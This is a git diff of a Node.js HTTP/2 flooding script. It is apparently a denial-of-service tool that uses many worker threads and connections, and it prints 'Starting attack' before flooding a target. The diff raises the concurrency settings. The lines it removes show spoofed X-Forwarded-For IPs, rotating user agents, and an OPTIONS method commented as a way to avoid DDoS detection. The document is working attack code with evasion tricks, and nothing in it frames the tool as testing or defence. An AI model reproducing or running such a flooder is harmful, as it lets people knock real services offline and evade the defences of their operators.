@@ -2,20 +2,13 @@ const http2 = require('http2');
 const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const { cpus } = require('os');
 const readline = require('readline');
-const fs = require('fs');
 const net = require('net');
 
-// Load user-agent list from file
-const userAgents = fs.readFileSync('ua.txt', 'utf8').split('\n').filter(Boolean);
-
-// Constants
 const THREADS = 16;
-const INITIAL_CONNECTIONS = 20;
-const POWER_MULTIPLIER = 2;
-const WARMUP_TIME = 5000;
+const INITIAL_CONNECTIONS =25;
+const POWER_MULTIPLIER = 3;
+const WARMUP_TIME = 10000;
 const MAX_INFLIGHT = 2000;
-const IP_RANGE_START = 167772160;  // 10.0.0.0
-const IP_RANGE_END = 184549375;    // 10.255.255.255
 
 let totalRequests = 0;
 let successCount = 0;
@@ -33,7 +26,7 @@ if (isMainThread) {
     const duration = parseInt(process.argv[3]);
 
     console.clear();
-    console.log(`Warming up... Starting attack in 5s`);
+    console.log(`Warming up... Starting attack in 10s`);
 
     setTimeout(() => {
         console.clear();
@@ -92,28 +85,6 @@ if (isMainThread) {
     const socket = net.connect(9999, '127.0.0.1');
     const sendStat = msg => socket.write(msg);
 
-    // Function to generate a random IP within a specific range
-    function generateRandomIP() {
-        const randomIP = IP_RANGE_START + Math.floor(Math.random() * (IP_RANGE_END - IP_RANGE_START + 1));
-        return ((randomIP >>> 24) & 255) + '.' + ((randomIP >>> 16) & 255) + '.' + ((randomIP >>> 8) & 255) + '.' + (randomIP & 255);
-    }
-
-    // Function to choose a random User-Agent from the list
-    function getRandomUserAgent() {
-        return userAgents[Math.floor(Math.random() * userAgents.length)];
-    }
-
-    // Function to create request headers with rotating spoofed headers
-    function getSpoofedHeaders() {
-        return {
-            'User-Agent': getRandomUserAgent(),
-            'X-Forwarded-For': generateRandomIP(),
-            'Referer': `https://www.example.com/${Math.random().toString(36).substring(7)}`,
-            'Origin': `https://www.example.com`,
-            'Connection': 'keep-alive',
-        };
-    }
-
     function sendOne(client, inflight) {
         if (Date.now() > end) return;
 
@@ -123,13 +94,7 @@ if (isMainThread) {
 
         try {
             inflight.count++;
-            const headers = getSpoofedHeaders();
-            const req = client.request({ 
-                ':path': '/', 
-                ':method': 'OPTIONS', // Low-profile method to avoid triggering DDOS detection
-                ...headers
-            });
-
+            const req = client.request({ ':path': '/', ':method': 'GET' });
             req.setNoDelay?.(true);
             req.on('response', () => {
                 sendStat('ok');
